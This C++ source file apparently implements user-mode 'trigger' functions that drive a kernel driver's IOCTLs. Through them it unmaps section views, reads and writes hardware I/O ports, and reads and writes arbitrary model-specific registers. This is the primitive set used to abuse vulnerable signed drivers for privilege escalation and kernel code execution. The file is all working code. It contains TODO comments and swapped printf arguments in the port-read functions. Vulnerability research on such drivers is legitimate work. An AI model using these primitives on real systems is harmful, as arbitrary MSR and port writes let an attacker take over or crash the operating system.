#include "Ioctl.h"


BOOL IoctlTriggers::UnmapViewOfSectionTrigger(HANDLE DriverHandle, PVOID ViewBaseAddress) {
	UNMAP_VIEWSECTION_BUFFER DriverParams = { 0 };
	DWORD BytesReturned = 0;
	DriverParams.ViewBaseAddress = ViewBaseAddress;
	if (ViewBaseAddress == NULL || DriverHandle == NULL || DriverHandle == INVALID_HANDLE_VALUE) {
		printf("[-] UnmapViewOfSectionTrigger - invalid parameters\n");
		return FALSE;
	}
	if (!DeviceIoControl(DriverHandle, UNMAP_VIEWSECTION_IOCTL, &DriverParams,
		sizeof(DriverParams), &DriverParams, sizeof(DriverParams), &BytesReturned, NULL)) {
		printf("[-] UnmapViewOfSectionTrigger(%p) failed - %d\n", ViewBaseAddress, GetLastError());
		return FALSE;
	}
	printf("[+] UnmapViewOfSectionTrigger(%p) succeeded, BytesReturned = %lu\n", ViewBaseAddress, BytesReturned);
	return TRUE;
}


BOOL IoctlTriggers::ReadByteHardwarePortTrigger(HANDLE DriverHandle, USHORT HardwarePort, DWORD* ValueFromPort) {
	READBYTE_HARDWAREPORT_BUFFER DriverParams = { 0 };
	DWORD BytesReturned = 0;
	DriverParams.PortNumber = HardwarePort;
	if (HardwarePort == 0 || DriverHandle == NULL || DriverHandle == INVALID_HANDLE_VALUE) {
		printf("[-] ReadByteHardwarePortTrigger - invalid parameters\n");
		return FALSE;
	}
	if (!DeviceIoControl(DriverHandle, READBYTE_HARDWAREPORT_IOCTL, &DriverParams,
		sizeof(DriverParams), &DriverParams, sizeof(DriverParams), &BytesReturned, NULL)) {
		printf("[-] ReadByteHardwarePortTrigger(%hu) failed - %d\n", HardwarePort, GetLastError());
		return FALSE;
	}
	printf("[+] ReadByteHardwarePortTrigger(%hu) succeeded -> %d, BytesReturned = %lu\n",
		DriverParams.ValueFromPort, HardwarePort, BytesReturned);
	if (ValueFromPort != NULL) {
		*ValueFromPort = DriverParams.ValueFromPort;
	}
	return TRUE;
}


BOOL IoctlTriggers::ReadWordHardwarePortTrigger(HANDLE DriverHandle, USHORT HardwarePort, DWORD* ValueFromPort) {
	READWORD_HARDWAREPORT_BUFFER DriverParams = { 0 };
	DWORD BytesReturned = 0;
	DriverParams.PortNumber = HardwarePort;
	if (HardwarePort == 0 || DriverHandle == NULL || DriverHandle == INVALID_HANDLE_VALUE) {
		printf("[-] ReadWordHardwarePortTrigger - invalid parameters\n");
		return FALSE;
	}
	if (!DeviceIoControl(DriverHandle, READWORD_HARDWAREPORT_IOCTL, &DriverParams,
		sizeof(DriverParams), &DriverParams, sizeof(DriverParams), &BytesReturned, NULL)) {
		printf("[-] ReadWordHardwarePortTrigger(%hu) failed - %d\n", HardwarePort, GetLastError());
		return FALSE;
	}
	printf("[+] ReadWordHardwarePortTrigger(%hu) succeeded -> %d, BytesReturned = %lu\n",
		DriverParams.ValueFromPort, HardwarePort, BytesReturned);
	if (ValueFromPort != NULL) {
		*ValueFromPort = DriverParams.ValueFromPort;
	}
	return TRUE;
}


BOOL IoctlTriggers::ReadDwordHardwarePortTrigger(HANDLE DriverHandle, USHORT HardwarePort, DWORD* ValueFromPort) {
	READDWORD_HARDWAREPORT_BUFFER DriverParams = { 0 };
	DWORD BytesReturned = 0;
	DriverParams.PortNumber = HardwarePort;
	if (HardwarePort == 0 || DriverHandle == NULL || DriverHandle == INVALID_HANDLE_VALUE) {
		printf("[-] ReadDwordHardwarePortTrigger - invalid parameters\n");
		return FALSE;
	}
	if (!DeviceIoControl(DriverHandle, READDWORD_HARDWAREPORT_IOCTL, &DriverParams,
		sizeof(DriverParams), &DriverParams, sizeof(DriverParams), &BytesReturned, NULL)) {
		printf("[-] ReadDwordHardwarePortTrigger(%hu) failed - %d\n", HardwarePort, GetLastError());
		return FALSE;
	}
	printf("[+] ReadDwordHardwarePortTrigger(%hu) succeeded -> %d, BytesReturned = %lu\n",
		DriverParams.ValueFromPort, HardwarePort, BytesReturned);
	if (ValueFromPort != NULL) {
		*ValueFromPort = DriverParams.ValueFromPort;
	}
	return TRUE;
}


BOOL IoctlTriggers::WriteByteHardwarePortTrigger(HANDLE DriverHandle, USHORT HardwarePort, BYTE ValueToPort) {
	WRITEBYTE_HARDWAREPORT_BUFFER DriverParams = { 0 };
	DWORD BytesReturned = 0;
	DriverParams.PortNumber = HardwarePort;
	DriverParams.ValueToPort = ValueToPort;

	if (HardwarePort == 0 || DriverHandle == NULL || DriverHandle == INVALID_HANDLE_VALUE) {
		printf("[-] WriteByteHardwarePortTrigger - invalid parameters\n");
		return FALSE;
	}
	if (!DeviceIoControl(DriverHandle, WRITEBYTE_HARDWAREPORT_IOCTL, &DriverParams,
		sizeof(DriverParams), &DriverParams, sizeof(DriverParams), &BytesReturned, NULL)) {
		printf("[-] WriteByteHardwarePortTrigger(%hu, %d) failed - %d\n", HardwarePort, ValueToPort, GetLastError());
		return FALSE;
	}
	printf("[+] WriteByteHardwarePortTrigger(%hu, %d) succeeded, BytesReturned = %lu\n",
		HardwarePort, ValueToPort, BytesReturned);
	return TRUE;
}


BOOL IoctlTriggers::WriteWordHardwarePortTrigger(HANDLE DriverHandle, USHORT HardwarePort, USHORT ValueToPort) {
	WRITEWORD_HARDWAREPORT_BUFFER DriverParams = { 0 };
	DWORD BytesReturned = 0;
	DriverParams.PortNumber = HardwarePort;
	DriverParams.ValueToPort = ValueToPort;

	if (HardwarePort == 0 || DriverHandle == NULL || DriverHandle == INVALID_HANDLE_VALUE) {
		printf("[-] WriteWordHardwarePortTrigger - invalid parameters\n");
		return FALSE;
	}
	if (!DeviceIoControl(DriverHandle, WRITEWORD_HARDWAREPORT_IOCTL, &DriverParams,
		sizeof(DriverParams), &DriverParams, sizeof(DriverParams), &BytesReturned, NULL)) {
		printf("[-] WriteWordHardwarePortTrigger(%hu, %d) failed - %d\n", HardwarePort, ValueToPort, GetLastError());
		return FALSE;
	}
	printf("[+] WriteWordHardwarePortTrigger(%hu, %d) succeeded, BytesReturned = %lu\n",
		HardwarePort, ValueToPort, BytesReturned);
	return TRUE;
}


BOOL IoctlTriggers::WriteDwordHardwarePortTrigger(HANDLE DriverHandle, USHORT HardwarePort, DWORD ValueToPort) {
	WRITEDWORD_HARDWAREPORT_BUFFER DriverParams = { 0 };
	DWORD BytesReturned = 0;
	DriverParams.PortNumber = HardwarePort;
	DriverParams.ValueToPort = ValueToPort;

	if (HardwarePort == 0 || DriverHandle == NULL || DriverHandle == INVALID_HANDLE_VALUE) {
		printf("[-] WriteDwordHardwarePortTrigger - invalid parameters\n");
		return FALSE;
	}
	if (!DeviceIoControl(DriverHandle, WRITEDWORD_HARDWAREPORT_IOCTL, &DriverParams,
		sizeof(DriverParams), &DriverParams, sizeof(DriverParams), &BytesReturned, NULL)) {
		printf("[-] WriteDwordHardwarePortTrigger(%hu, %d) failed - %d\n", HardwarePort, ValueToPort, GetLastError());
		return FALSE;
	}
	printf("[+] WriteDwordHardwarePortTrigger(%hu, %d) succeeded, BytesReturned = %lu\n",
		HardwarePort, ValueToPort, BytesReturned);
	return TRUE;
}


BOOL IoctlTriggers::ReadFromMsrTrigger(HANDLE DriverHandle, DWORD MsrToReadFrom, PVOID* ValueFromMsr) {
	READMSR_BUFFER DriverParams = { 0 };
	DWORD BytesReturned = 0;
	*((DWORD*)(&DriverParams)) = MsrToReadFrom;
	if (DriverHandle == NULL || DriverHandle == INVALID_HANDLE_VALUE) {
		printf("[-] ReadFromMsrTrigger - invalid parameters\n");
		return FALSE;
	}
	if (!DeviceIoControl(DriverHandle, READMSR_IOCTL, &DriverParams,
		sizeof(DriverParams), &DriverParams, sizeof(DriverParams), &BytesReturned, NULL)) {
		printf("[-] ReadFromMsrTrigger(%d) failed - %d\n", MsrToReadFrom, GetLastError());
		return FALSE;
	}
	printf("[+] ReadFromMsrTrigger(%d) succeeded -> %p, BytesReturned = %lu\n",
		MsrToReadFrom, DriverParams.ValueFromMsr, BytesReturned);  // TODO: FIGURE OUT HOW TO PARSE OUTPUT // 
	if (ValueFromMsr != NULL) {
		*ValueFromMsr = DriverParams.ValueFromMsr;
	}
	return TRUE;
}


BOOL IoctlTriggers::WriteToMsrTrigger(HANDLE DriverHandle, DWORD MsrToWriteTo, ULONG64 ValueToWrite) {
	WRITEMSR_BUFFER DriverParams = { 0 };
	DWORD BytesReturned = 0;
	DriverParams.TargetMsr = MsrToWriteTo;
	DriverParams.ValueToMsr = (PVOID)ValueToWrite;
	if (ValueToWrite == 0 || DriverHandle == NULL || DriverHandle == INVALID_HANDLE_VALUE) {
		printf("[-] WriteToMsrTrigger - invalid parameters\n");
		return FALSE;
	}
	if (!DeviceIoControl(DriverHandle, WRITEMSR_IOCTL, &DriverParams,
		sizeof(DriverParams), &DriverParams, sizeof(DriverParams), &BytesReturned, NULL)) {
		printf("[-] WriteToMsrTrigger(%d, %p) failed - %d\n", MsrToWriteTo, ValueToWrite, GetLastError());
		return FALSE;
	}
	printf("[+] WriteToMsrTrigger(%d, %p) succeeded, BytesReturned = %lu\n",
		MsrToWriteTo, ValueToWrite, BytesReturned);  // TODO: FIGURE OUT HOW TO PARSE OUTPUT // 
	return TRUE;
}